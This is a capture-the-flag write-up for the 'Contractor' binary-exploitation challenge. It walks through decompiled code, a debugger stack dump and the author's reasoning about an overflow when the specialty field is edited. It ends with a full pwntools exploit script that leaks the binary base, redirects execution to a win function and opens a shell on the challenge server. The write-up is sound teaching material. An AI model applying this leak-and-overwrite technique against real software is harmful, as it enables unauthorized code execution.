---
title: Contractor
date: 2025-03-29T20:14:26+02:00
description: Writeup for Contractor [HTB Cyber Apocalypse CTF 2025]
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

Sir Alaric calls upon the bravest adventurers to join him in assembling the mightiest army in all of Eldoria. Together, you will safeguard the peace across the villages under his protection. Do you have the courage to answer the call?

## Intuition

Decompiled main is shown in the following listing:

```c
undefined8 main(void)
{
  undefined8 uVar1;
  char *pcVar2;
  int iVar3;
  char *pcVar4;
  int *piVar5;
  long in_FS_OFFSET;
  int choice;
  int local_24;
  char *local_20;
  char local_14 [4];
  long cookie;
  
  cookie = *(long *)(in_FS_OFFSET + 0x28);
  for (piVar5 = &choice; piVar5 != &choice; piVar5 = (int *)((long)piVar5 + -0x1000)) {
    *(undefined8 *)((long)piVar5 + -8) = *(undefined8 *)((long)piVar5 + -8);
  }
  *(undefined8 *)((long)piVar5 + -8) = *(undefined8 *)((long)piVar5 + -8);
  local_20 = (char *)((ulong)((long)piVar5 + -0x121) & 0xfffffffffffffff0);
  *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace4f9;
  memset((char *)((ulong)((long)piVar5 + -0x121) & 0xfffffffffffffff0),0,0x128);
  *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace51f;
  printf("%s[%sSir Alaric%s]: Young lad, I\'m truly glad you want to join forces with me, but first I need you to tell me some things about you.. Please introduce yourself. What is your name?\n\n> "
         ,"\x1b[1;34m","\x1b[1;33m","\x1b[1;34m");
  for (i = 0; i < 0x10; i = i + 1) {
    *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace541;
    read(0,&safe_buffer,1);
    if (safe_buffer == '\n') break;
    local_20[(int)i] = safe_buffer;
  }
  *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace59e;
  printf("\n[%sSir Alaric%s]: Excellent! Now can you tell me the reason you want to join me?\n\n> ",
         "\x1b[1;33m","\x1b[1;34m");
  for (i = 0; i < 0x100; i = i + 1) {
    *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace5c0;
    read(0,&safe_buffer,1);
    if (safe_buffer == '\n') break;
    local_20[(long)(int)i + 0x10] = safe_buffer;
  }
  *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace620;
  printf("\n[%sSir Alaric%s]: That\'s quite the reason why! And what is your age again?\n\n> ",
         "\x1b[1;33m","\x1b[1;34m");
  pcVar4 = local_20 + 0x110;
  *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace63e;
  __isoc99_scanf("%ld",pcVar4);
  *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace65d;
  printf("\n[%sSir Alaric%s]: You sound mature and experienced! One last thing, you have a certain s pecialty in combat?\n\n> "
         ,"\x1b[1;33m","\x1b[1;34m");
  for (i = 0; i < 0x10; i = i + 1) {
    *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace67f;
    read(0,&safe_buffer,1);
    if (safe_buffer == '\n') break;
    local_20[(long)(int)i + 0x118] = safe_buffer;
  }
  pcVar2 = local_20;
  uVar1 = *(undefined8 *)(local_20 + 0x110);
  pcVar4 = local_20 + 0x10;
  *(char **)((long)piVar5 + -0x140) = local_20 + 0x118;
  *(undefined8 *)((long)piVar5 + -0x148) = 0x65214bace710;
  printf("\n[%sSir Alaric%s]: So, to sum things up: \n\n+------------------------------------------- -----------------------------+\n\n\t[Name]: %s\n\t[Reason to join]: %s\n\t[Age]: %ld\n\t[Specialty ]: %s\n\n+------------------------------------------------------------------------+\n\n"
         ,"\x1b[1;33m","\x1b[1;34m",pcVar2,pcVar4,uVar1);
  local_24 = 0;
  *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace73a;
  printf("[%sSir Alaric%s]: Please review and verify that your information is true and correct.\n",
         "\x1b[1;33m","\x1b[1;34m");
  do {
    *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace74b;
    printf("\n1. Name      2. Reason\n3. Age       4. Specialty\n\n> ");
    *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace763;
    __isoc99_scanf("%d",&choice);
    if (choice == 4) {
      *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace931;
      printf("\n%s[%sSir Alaric%s]: And what are you good at: ","\x1b[1;34m","\x1b[1;33m",
             "\x1b[1;34m");
      for (i = 0; i < 0x100; i = i + 1) {
        *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace953;
        read(0,&safe_buffer,1);
        if (safe_buffer == '\n') break;
        local_20[(long)(int)i + 0x118] = safe_buffer;
      }
      local_24 = local_24 + 1;
    }
    else {
      if (4 < choice) {
LAB_65214bace99d:
        *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace9c3;
        printf("\n%s[%sSir Alaric%s]: Are you mocking me kid??\n\n",&DAT_65214bacf010,"\x1b[1;33m",
               &DAT_65214bacf010);
                    /* WARNING: Subroutine does not return */
        *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace9cd;
        exit(0x520);
      }
      if (choice == 3) {
        *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace8e4;
        printf("\n%s[%sSir Alaric%s]: Did you say you are 120 years old? Please specify again: ",
               "\x1b[1;34m","\x1b[1;33m","\x1b[1;34m");
        pcVar4 = local_20 + 0x110;
        *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace902;
        __isoc99_scanf("%d",pcVar4);
        local_24 = local_24 + 1;
      }
      else {
        if (3 < choice) goto LAB_65214bace99d;
        if (choice == 1) {
          *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace7c3;
          printf("\n%s[%sSir Alaric%s]: Say your name again: ","\x1b[1;34m","\x1b[1;33m",
                 "\x1b[1;34m");
          for (i = 0; i < 0x10; i = i + 1) {
            *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace7e5;
            read(0,&safe_buffer,1);
            if (safe_buffer == '\n') break;
            local_20[(int)i] = safe_buffer;
          }
          local_24 = local_24 + 1;
        }
        else {
          if (choice != 2) goto LAB_65214bace99d;
          *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace852;
          printf("\n%s[%sSir Alaric%s]: Specify the reason again please: ","\x1b[1;34m","\x1b[1;33m"
                 ,"\x1b[1;34m");
          for (i = 0; i < 0x100; i = i + 1) {
            *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace874;
            read(0,&safe_buffer,1);
            if (safe_buffer == '\n') break;
            local_20[(long)(int)i + 0x10] = safe_buffer;
          }
          local_24 = local_24 + 1;
        }
      }
    }
    if (local_24 == 1) {
      *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace9fd;
      printf("\n%s[%sSir Alaric%s]: I suppose everything is correct now?\n\n> ","\x1b[1;34m",
             "\x1b[1;33m","\x1b[1;34m");
      for (i = 0; i < 4; i = i + 1) {
        *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bacea1f;
        read(0,&safe_buffer,1);
        if (safe_buffer == '\n') break;
        local_14[(int)i] = safe_buffer;
      }
      *(undefined8 *)((long)piVar5 + -0x138) = 0x65214bacea72;
      iVar3 = strncmp(local_14,"Yes",3);
      if (iVar3 == 0) break;
    }
  } while (local_24 < 2);
  *(undefined8 *)((long)piVar5 + -0x138) = 0x65214baceaa9;
  printf("\n%s[%sSir Alaric%s]: We are ready to recruit you young lad!\n\n","\x1b[1;34m",
         "\x1b[1;33m","\x1b[1;34m");
  if (cookie != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    *(undefined8 *)((long)piVar5 + -0x138) = 0x65214baceac2;
    __stack_chk_fail();
  }
  return 0;
}
```

Code is kinda huge and it has a TON of weird instructions such as `*(undefined8 *)((long)piVar5 + -0x138) = 0x65214bace9fd`.
The important things we have to notice are:

1. The data we write is printed back: `printf("\n[%sSir Alaric%s]: So, to sum things up: \n\n+------------------------------------------- -----------------------------+\n\n\t[Name]: %s\n\t[Reason to join]: %s\n\t[Age]: %ld\n\t[Specialty ]: %s\n\n+------------------------------------------------------------------------+\n\n"`. Could be useful for leaks.
2. When the specialty is inquired about, the maximum input size is 0x10, as per the for: `for (i = 0; i < 0x10; i = i + 1)`.
3. When the specialty is edited, the maximum input size is 0x100. Smells like an overflow.

Indeed it turns out to be an overflow, if we fill in the maximum length of all our inputs and then inspect the program state in a debugger, we can notice various things.

Firstly, we can fill the inputs like this in Python:

```py
# Name
target.send(b"a" * 0x10)

# Reason
target.send(b"b" * 0x100)

# Age
target.sendline(b"9223372036854775808")

# Specialty
target.send(b"c" * 0x10)
```

Then if we inspect the program with a debugger, after all payloads are sent:

```
pwndbg> stack 50
00:0000│ rsp 0x7ffc78a01150 —▸ 0x7ffc78a01278 ◂— 0x6363636363636363 ('cccccccc')
01:0008│-158 0x7ffc78a01158 —▸ 0x6281c512567f (main+574) ◂— movzx eax, byte ptr [rip + 0x29a6]
02:0010│ rcx 0x7ffc78a01160 ◂— 0x6161616161616161 ('aaaaaaaa')
03:0018│-148 0x7ffc78a01168 ◂— 0x6161616161616161 ('aaaaaaaa')
04:0020│ r8  0x7ffc78a01170 ◂— 0x6262626262626262 ('bbbbbbbb')
... ↓        31 skipped
24:0120│-040 0x7ffc78a01270 ◂— 0x7fffffffffffffff
25:0128│-038 0x7ffc78a01278 ◂— 0x6363636363636363 ('cccccccc')
26:0130│-030 0x7ffc78a01280 ◂— 0x6363636363636363 ('cccccccc')
27:0138│-028 0x7ffc78a01288 —▸ 0x6281c5125b50 (__libc_csu_init) ◂— endbr64 
28:0140│-020 0x7ffc78a01290 ◂— 0
29:0148│-018 0x7ffc78a01298 —▸ 0x7ffc78a01160 ◂— 0x6161616161616161 ('aaaaaaaa')
2a:0150│-010 0x7ffc78a012a0 —▸ 0x7ffc78a013a0 ◂— 1
2b:0158│-008 0x7ffc78a012a8 ◂— 0x1e6d270a9f6a300
2c:0160│ rbp 0x7ffc78a012b0 ◂— 0
2d:0168│+008 0x7ffc78a012b8 —▸ 0x7c12aa79b083 (__libc_start_main+243) ◂— mov edi, eax
2e:0170│+010 0x7ffc78a012c0 ◂— 0x200000021 /* '!' */
2f:0178│+018 0x7ffc78a012c8 —▸ 0x7ffc78a013a8 —▸ 0x7ffc78a032d8 ◂— './contractor'
30:0180│+020 0x7ffc78a012d0 ◂— 0x1aa95f7a0
31:0188│+028 0x7ffc78a012d8 —▸ 0x6281c5125441 (main) ◂— endbr64 
```

Notice how the payload is displayed on the stack. When our specialty is printed, `__libc_csu_init` should be leaked as well, because the specialty does not end in a NULL byte. This way we can leak the binary's base, as `__libc_csu_init` is in the binary's code segment.

Then we can edit the specialty to keep overwriting the stack. When we reach `0x7ffc78a01298` in the example above,
we run into some issues. Specifically, `0x7ffc78a01298` holds a stack pointer to the beginning of our payload: `0x7ffc78a01160`.
This is actually a pointer used in the code to write the payload, as I gathered from dynamic analysis.

Dynamic analysis kinda rules, you can make a lot of intuitive assumptions that turn out to be correct without actually
fully understanding the decompiled code.

Anyways, if we start overwriting this pointer, our input "cursor" will move. So our overflow will start happen somewhere else.
Kinda like a portal for the payload. So my idea here was prety simple: overwrite 1 byte of the pointer to start pointing
to the return address and then overwrite it with the win function. Oh yeah right forgot to mention, there is a win function.

But the problem is, the stack address is randomized, so we don't know where the return address will be.
So after some more dynamic analysis I figured out that the byte I overwrite it with has to end in `0x0f` for it
to possibly land on the return address.

So I just overwrite that byte with `0x3f` because for some reason I felt like it's a good number and it has chances to reach the return address. Then the rest of the payload is basically writing the win function's address.

This is quite unreliable and has a low chance of hitting the return address, but it actually works given enough runs.
In retrospective, I guess I could have leaked the stack pointer itself, instead of the `__libc_csu_init`.
Then I could overwrite the byte specifically to point to the return address.
Even though I did not have the binary's base, I could still overwrite the lower bytes of the return address to point
to the win function, as they are in the same mapped address range.

## Solution

Run it until you get a shell. Too lazy to make a program that checks if it got a shell or not automatically so whatever.
Doesn't have *horrible* chances to land so...

```py
#!/usr/bin/env python3

from pwn import *

#target = process("./contractor")
target = remote("94.237.58.78", 46929)

# Name
target.send(b"a" * 0x10)

# Reason
target.send(b"b" * 0x100)

# Age
target.sendline(b"9223372036854775808")

# Specialty
target.send(b"c" * 0x10)

target.recvuntil(b"[Specialty]: ")
pie_leak = target.recvline()[16:-1] + b"\x00" * 2
offset = 6992
base_leak = u64(pie_leak) - offset
win = base_leak + 0x1343

print(f"BASE: {hex(base_leak)}, WIN: {hex(win)}")

# Review
target.sendline(b"4")
# Specialty
payload = b"d" * 24 + p32(0x01) + p32(0x01) + b"\x3f" + p64(win)

# I need to pivot 64 bytes upwards
target.sendline(payload)

target.interactive()
```

I had to run the exploit about ~30 times to get a shell while writing this. Doesn't take long if you have quick hands to stop it as soon as you see `Got EOF while reading in interactive`, lol.

### Flag

`HTB{4_l1ttl3_bf_41nt_b4d_SOME_UNIQUE_ID}`

I have no idea what `bf` means here? brainfuck?
